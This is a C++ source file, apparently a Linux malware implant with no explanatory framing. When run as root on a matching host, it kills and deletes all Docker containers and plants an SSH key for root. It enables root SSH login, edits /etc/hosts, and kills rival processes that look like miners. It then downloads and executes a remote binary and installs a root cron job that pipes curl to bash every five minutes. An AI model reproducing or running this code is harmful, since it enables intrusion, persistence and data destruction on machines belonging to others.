#include <iostream>
#include <fstream>
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <signal.h>
#include <cstring>
#include <vector>

bool checkHostname(const std::string& targetHostname) {
    char hostname[1024];
    gethostname(hostname, sizeof(hostname));
    return std::string(hostname) == targetHostname;
}

bool checkRoot() {
    return geteuid() == 0;
}

void executeCommand(const std::string& command) {
    system(command.c_str());
}

void stopAndRemoveDockerContainers() {
    executeCommand("docker kill $(docker ps -q)");
    executeCommand("docker rm $(docker ps -a -q)");
}

void appendSSHKey() {
    std::ofstream authKeys("/root/.ssh/authorized_keys", std::ios_base::app);
    if (authKeys.is_open()) {
        authKeys << "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@placeholder_host\n";
        authKeys.close();
    }
}

void modifyConfigs() {
    std::ofstream resolvConf("/etc/resolv.conf", std::ios_base::app);
    if (resolvConf.is_open()) {
        resolvConf << "nameserver 8.8.8.8\n";
        resolvConf.close();
    }

    std::ofstream sshdConfig("/etc/ssh/sshd_config", std::ios_base::app);
    if (sshdConfig.is_open()) {
        sshdConfig << "PermitRootLogin yes\n";
        sshdConfig.close();
    }

    std::ofstream hosts("/etc/hosts", std::ios_base::app);
    if (hosts.is_open()) {
        hosts << "128.90.59.19 placeholder-domain\n";
        hosts.close();
    }
}

void terminateProcesses() {
    DIR* procDir = opendir("/proc");
    if (!procDir) return;

    std::vector<std::string> patterns = {
        "/var/lib/postgresql/data/postgres", "atlas.x86", "dotsh", "/tmp/systemd-private-", 
        "bin/sysinit", ".bin/xorg", "nine.x86", "/var/tmp/.bin/systemd", "balder",
        "sys/systemd", "rtw88_pcied", ".bin/x", "httpd_watchdog", "cpu_hu", 
        "/tmp/agettyd", "/var/tmp/java", "pgdata/postmaster"
    };

    struct dirent* entry;
    while ((entry = readdir(procDir)) != NULL) {
        std::string procPath = "/proc/" + std::string(entry->d_name);
        std::string exePath = procPath + "/exe";
        char linkTarget[256];
        ssize_t len = readlink(exePath.c_str(), linkTarget, sizeof(linkTarget) - 1);
        if (len != -1) {
            linkTarget[len] = '\0';
            for (const auto& pattern : patterns) {
                if (strstr(linkTarget, pattern.c_str())) {
                    int pid = atoi(entry->d_name);
                    kill(pid, SIGKILL);
                    std::cout << "Terminated process with PID: " << pid << std::endl;
                    break;
                }
            }
        }
    }
    closedir(procDir);
}

void downloadAndRunBinary(const std::string& arch) {
    std::string url = "http://placeholder-domain/0xda4.0xda4." + arch;
    executeCommand("cd /tmp && wget " + url + " && chmod 777 0xda4.0xda4." + arch + " && ./0xda4.0xda4." + arch);
}

void appendCronJob(const std::string& arch) {
    std::ofstream crontab("/etc/crontab", std::ios_base::app);
    if (crontab.is_open()) {
        crontab << "*/5 * * * * root curl -s http://placeholder-domain/0xda4.0xda4." << arch << " | bash\n";
        crontab.close();
    }
}

std::string getArchitecture() {
    char buffer[128];
    FILE* pipe = popen("uname -m", "r");
    if (!pipe) return "";
    fgets(buffer, sizeof(buffer), pipe);
    pclose(pipe);
    std::string arch(buffer);
    arch.erase(arch.find_last_not_of(" \n\r\t") + 1);
    return arch;
}

int main() {
    if (!checkHostname("placeholder-hostname")) return 1;
    if (!checkRoot()) return 1;

    stopAndRemoveDockerContainers();
    appendSSHKey();
    modifyConfigs();
    terminateProcesses();

    std::string arch = getArchitecture();
    if (!arch.empty()) {
        downloadAndRunBinary(arch);
        appendCronJob(arch);
    }

    return 0;
}

